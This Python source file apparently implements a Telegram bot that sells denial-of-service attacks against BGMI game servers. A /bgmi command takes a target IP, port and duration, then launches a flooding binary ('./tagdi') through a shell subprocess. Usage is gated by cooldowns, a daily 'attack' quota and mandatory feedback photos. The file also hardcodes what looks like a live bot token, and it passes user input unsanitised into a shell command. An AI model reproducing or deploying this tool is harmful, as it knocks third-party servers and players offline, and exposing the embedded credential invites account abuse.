import logging
import asyncio
import io
from datetime import datetime, timedelta, timezone
from PIL import Image
import imagehash
from telegram import ChatPermissions, Update
from telegram.ext import (
    Application, MessageHandler, filters, CallbackContext, CommandHandler
)

# Logging setup
logging.basicConfig(level=logging.INFO)

# Bot Token & Group ID
TOKEN = "7861458890:AAELMEzs-xr0C57SF1Z7s9NYSaQOdXMfwVs"  # Replace with actual bot token
CHANNEL_ID = -1002650037232 # Replace with your group/channel ID

# Attack & Cooldown Config
COOLDOWN_DURATION = 60  # 60 sec cooldown
DAILY_ATTACK_LIMIT = 5000  # Max daily attacks
EXEMPTED_USERS = [6957116305, 6957116305]  # Users with no cooldown

user_attacks = {}  # Tracks number of attacks per user
user_cooldowns = {}  # Tracks cooldown time per user
user_photos = {}  # Tracks feedback status per user
image_hashes = {}  # Tracks duplicate images

# Function to calculate image hash
async def get_image_hash(bot, file_id):
    new_file = await bot.get_file(file_id)
    image_bytes = await new_file.download_as_bytearray()
    image = Image.open(io.BytesIO(image_bytes))
    return str(imagehash.average_hash(image))

# Function to handle duplicate images and mute users
async def handle_images(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id

    if update.message.photo:
        file_id = update.message.photo[-1].file_id
        img_hash = await get_image_hash(context.bot, file_id)

        if img_hash in image_hashes:
            mute_duration = 15  # Mute for 15 minutes
            unmute_time = datetime.now(timezone.utc) + timedelta(minutes=mute_duration)  # Convert to UTC

            # Mute the user
            await context.bot.restrict_chat_member(
                chat_id, user_id, ChatPermissions(can_send_messages=False), until_date=unmute_time
            )

            # Send mute notification without time info
            await update.message.reply_text(
                f"⚠️ @{update.message.from_user.username} duplicate photo bheji!\n"
                f"⏳ Duplicate feedback hai real feedback do islie apko {mute_duration} min ke liye mute kiya jata hai."
            )

            # Schedule auto-unmute
            context.job_queue.run_once(unmute_user, mute_duration * 60, data={"chat_id": chat_id, "user_id": user_id})

        else:
            image_hashes[img_hash] = user_id
            user_photos[user_id] = True  # Mark feedback as given
            await update.message.reply_text("✅ Feedback received! Ab aap next attack kar sakte ho.")

# Function to unmute user
async def unmute_user(context: CallbackContext):
    job_data = context.job.data
    chat_id, user_id = job_data["chat_id"], job_data["user_id"]

    await context.bot.restrict_chat_member(chat_id, user_id, ChatPermissions(can_send_messages=True))
    await context.bot.send_message(chat_id, f"✅ @{user_id} ka mute hat gaya!")
    
# BGMI Attack Command Handler
async def bgmi_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id

    if chat_id != CHANNEL_ID:
        await update.message.reply_text("⚠️ Bot sirf authorized channels me kaam karega!")
        return

    # Check cooldown
    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
        remaining_time = (user_cooldowns[user_id] - datetime.now()).seconds
        await update.message.reply_text(f"⚠️ Cooldown active! {remaining_time // 60} min {remaining_time % 60} sec rukho.")
        return

    # Check attack limit
    if user_id not in user_attacks:
        user_attacks[user_id] = 0
    if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
        await update.message.reply_text("🚀 Tumhara daily attack limit khatam ho gaya, kal try karo!")
        return

    # Check if feedback photo is given
    if user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
        await update.message.reply_text("⚠️ Feedback nahi diya, pehle feedback photo bhejo!")
        return

    try:
        args = context.args
        if len(args) != 3:
            raise ValueError("⚙ Format: /bgmi <IP> <Port> <Duration>")

        target_ip, target_port, user_duration = args
        if not target_ip.replace('.', '').isdigit() or not target_port.isdigit() or not user_duration.isdigit():
            raise ValueError("⚠️ Invalid Input! Sahi format me likho.")

        # Increase attack count
        user_attacks[user_id] += 1
        user_photos[user_id] = False  # Reset feedback requirement
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        await update.message.reply_text(
            f"🚀 Attack started on {target_ip}:{target_port} for 240 seconds! \n❗ Feedback photo bhejna mat bhoolna."
        )

        # Run attack command
        asyncio.create_task(run_attack_command_async(target_ip, int(target_port), 240, chat_id, context.bot))

    except Exception as e:
        await update.message.reply_text(str(e))

# Function to run attack command and send completion message
async def run_attack_command_async(target_ip, target_port, duration, chat_id, bot):
    try:
        command = f"./tagdi {target_ip} {target_port} {duration} 1400"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()

        # Attack finish hone ka message bhejo
        await bot.send_message(chat_id, f"✅ Attack finished on {target_ip}:{target_port}")
        logging.info(f"✅ Attack finished on {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"Error: {e}")

# Main function to run the bot
def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("bgmi", bgmi_command))
    application.add_handler(MessageHandler(filters.PHOTO, handle_images))

    logging.info("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
